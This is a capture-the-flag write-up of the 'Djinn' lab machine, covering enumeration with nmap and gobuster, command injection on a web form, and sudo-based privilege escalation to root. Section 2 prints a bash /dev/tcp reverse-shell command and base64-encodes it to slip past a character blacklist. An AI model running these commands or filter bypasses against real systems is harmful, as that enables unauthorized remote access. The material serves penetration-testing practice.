# Djinn

# 1 Information gathering
## 1.1 Discovery host
`nmap -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
![f84de650feb2a1309625aaff4adfb83d.png](./_resources/65c9ec4d9d6e436788affd3d537225e8.png)


## 1.2 Service enum
`nmap -sV -sC -p- 192.168.196.129 -oN full_service_enum-sC.txt`
![0dfa4145e322dba95aa646e7848b2736.png](./_resources/e718053a0f39427195f3cdb2b63156cd.png)
![4d9ee0e7c513b63ab9e43920753b0cfa.png](./_resources/fa593ae22bce4d649b5ca31f14f7d272.png)

`nmap -sV -sU -F 192.168.196.129 -oN udp-sC-sV.txt`

## 1.3 Web port 7331
### 1.3.1 Enum web content
`gobuster dir -u http://192.168.196.129:7331/ -w /usr/share/wordlists/dirb/big.txt -t 50 -f -o info2.txt` <- with added slashs, it don't returns results.

`gobuster dir -u http://192.168.196.129:7331/ -w /usr/share/wordlists/dirb/big.txt -t 50`
![137c31d8c64c55e91dc55f8509ba7b28.png](./_resources/2c1abbb4f93b4766a582e39cf03f966c.png)

### 1.3.2 Genie page
![73ee3a1a033ca9c5d2d52b4318328c7c.png](./_resources/d1b4456acb9a46668dbf48e7d859be44.png)

### 1.3.3 Wish page
![4fe4d5bc99c2ef38bb722919db346e2c.png](./_resources/cd4601967aa149438cc73d58f44a578e.png)

What is typed here is interpreted as linux terminal commands.

![f6b3387328509646f7c9b061e16361b3.png](./_resources/8286b0d038d34ef2ae002ccb6cfdef7a.png)

And returns as paragraph:
![e2f0685e61fb2338ae0e8c44ba9a337f.png](./_resources/c38985976d964523baa9f9f8d507f11e.png)

At this point, we cag get a reverse shell with python.


# 2 Exploitation with bypass filter
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
All reverse shells were blocked. Apparently the "/" character is identified and blocked.

An attempt to bypass by base64 encoding worked.

`echo "bash -i >& /dev/tcp/192.168.196.121/4446 0>&1" | base64` <- on kali linux

`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ni4xMjEvNDQ0NiAwPiYxCg==" | base64 -d | bash` <- web target

![c926b53dcca77327de261371bdd5ae94.png](./_resources/7de7bf58eb6d426fa8781804e3fa845d.png)


# 3 Post-exploitation
![b383c43dd66b0db592da7b1f6cf54729.png](./_resources/8bfeb1670f7c4f579109be9dc515a1d4.png)

![07574321ad81f588af3baec59f7dd79e.png](./_resources/ddd5e85a4d234e808e4253af4a144dbf.png)

Here we can see the blocking method used, a blacklist.

Also there is a path with creeds:
`/home/nitish/.dev/creds.txt`

## 3.1 Nitish user
![aaf0cb7d10de10a197e5dacca4a33986.png](./_resources/13541d77403a41089cfe9d63609e82de.png)

## 3.2 Sam user
LinEnum.sh returns some good information:
![1edc98a678d34d2b5a4429915af11012.png](./_resources/a14c936000604e24be4d02ea01b1aac2.png)

![9ee8cb7829679ad52076e567d0bbc42e.png](./_resources/42142b9985ac4cd2a84fb49737257f7a.png)
![e8c813fb3c268fec928ddf195c0bc9c3.png](./_resources/5a720de76a2646f09b6f47939d7cdeb4.png)

![6f0504c7d3117be56275b846c57a04a4.png](./_resources/9131bcfeea654d8d83a11b9fddda923f.png)

After try different methods to get shell, none results.

### 3.2.1 Basic bin analisys and shell
The first way is to use the `strings` command to get some information. For that you need to download the binary to the Kali machine and use the command:
`strings genie`

![74bc7100322fa43b70786f2eafb09b79.png](./_resources/1f8738bdaf5348a58704eefb7ae629fa.png)

`sudo -u sam /usr/bin/genie -cmd test`
![7edf8421a3b7b63bb92645dd7d352d93.png](./_resources/ee6c7ca98ef2498ca964fb80bee54383.png)

## 3.3 Getting root
![3695c6c16ce44f8dfad4116e6bb3b6b7.png](./_resources/7833d0bbe56d4d6d849a59c6be42c398.png)

What works here, was set the option `2` and after type `num` (apparently a variable). Done, it's possible get root.
![1e94958da014e596d207797e8f0ccf28.png](./_resources/79dba6701e5d423cb26319b0efb2b889.png)
